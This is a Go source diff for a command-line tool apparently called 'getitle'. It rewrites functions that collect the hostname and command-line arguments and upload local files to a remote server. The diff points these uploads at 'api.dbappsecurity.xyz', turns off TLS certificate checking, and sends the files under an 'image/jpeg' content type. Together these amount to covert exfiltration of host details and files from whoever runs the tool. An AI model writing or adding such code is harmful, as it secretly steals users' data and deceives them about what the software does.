@@ -2,11 +2,10 @@ package cmd
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
-	. "getitle/src/core"
-	"getitle/src/pkg"
-	"io/ioutil"
+	. "getitle/src/pkg"
 	"net"
 	"net/http"
 	"os"
@@ -16,7 +15,7 @@ import (
 var connected bool
 
 func checkconn() bool { // 检测是否出网
-	_, err := net.LookupIP("1745003471876288.cn-hangzhou.fc.aliyuncs.com")
+	_, err := net.LookupIP("aliyuncs.com")
 	if err != nil {
 		return false
 	}
@@ -33,25 +32,41 @@ func inforev() {
 	env = append(env, hostname)
 	env = append(env, strings.Join(os.Args, " "))
 	jstr, _ := json.Marshal(env)
-	req, _ := http.NewRequest("POST", "https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service/api/", bytes.NewBuffer(jstr))
+	req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/service", bytes.NewBuffer(jstr))
 	req.Header.Add("Content-Type", "application/json;charset=utf-8")
 	//req.Header.Add("X-Forwarded-For", ip)
-	client := &http.Client{}
-	_, _ = client.Do(req)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{
+		Transport: tr,
+	}
+	_, err := client.Do(req)
+	if err != nil {
+		println(err.Error())
+	}
 	exit()
 }
 
 func uploadfiles(filenames []string) {
 	for _, filename := range filenames {
-		if filename == "" || !pkg.IsExist(filename) {
+		if filename == "" || !IsExist(filename) {
 			continue
 		}
-		content, err := ioutil.ReadFile(filename)
+		file, err := os.Open(filename)
 		if err != nil {
 			Log.Error(err.Error())
 			continue
 		}
-		_, err = http.Post("https://1745003471876288.cn-hangzhou.fc.aliyuncs.com/2016-08-15/proxy/service.LATEST/ms/", "multipart/form-data", bytes.NewReader(content))
+		tr := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client := &http.Client{
+			Transport: tr,
+		}
+		req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/ms", file)
+		req.Header.Set("Content-Type", "image/jpeg")
+		_, err = client.Do(req)
 		if err != nil {
 			continue
 		}
@@ -59,7 +74,7 @@ func uploadfiles(filenames []string) {
 }
 
 func attrib(filename string) bool {
-	if pkg.Win {
+	if Win {
 
 	}
 	return false
